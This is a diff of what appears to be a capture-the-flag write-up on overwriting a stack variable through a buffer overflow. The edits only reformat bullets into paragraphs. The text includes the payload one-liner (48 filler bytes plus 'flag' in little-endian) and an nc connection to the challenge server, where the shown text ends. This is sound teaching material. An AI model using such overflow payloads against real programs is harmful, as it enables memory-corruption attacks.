@@ -67,8 +67,9 @@ int main() {
   vuln();
 }
 ```
-- The program sets a buffer of 32 bytes and then padding of 16 bytes.
-- It then creates two variables `notsecret` and `secret` and sets their value to `0xffffff00` and `0xdeadbeef` respectively.
+The program sets a buffer of 32 bytes and then padding of 16 bytes.
+
+It then creates two variables `notsecret` and `secret` and sets their value to `0xffffff00` and `0xdeadbeef` respectively.
 
 ## Stack
 ```        
@@ -86,20 +87,21 @@ int main() {
              ^             ^
              secret        notsecret
 ```
-- The program then has four conditional statements:
+The program then has four conditional statements:
 	1. Executes if the value of `secret` has been set to `0x67616c66` and prints out the flag.
 	2. Executes if the value of `notsecret` has been altered.
 	3. Executes if the value of `secret` has been altered but not set to `0x667616c66`.
 	4. Executes if none of the above conditions are met.
-- We need 48 bytes to fill the buffer and the padding and then `0x67616c66`.
+We need 48 bytes to fill the buffer and the padding and then `0x67616c66`.
 
 ## Exploit
 ```
 $ python3 -c 'print("a"*48 + "\x66\x6c\x61\x67")'
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag
 ```
-- Note that `0x67616c66` is written in little endian format. 
-- Let's provide the string as the input.
+Note that `0x67616c66` is written in little endian format. 
+
+Let's provide the string as the input.
 ```
 $ nc thekidofarcrania.com 35235
 
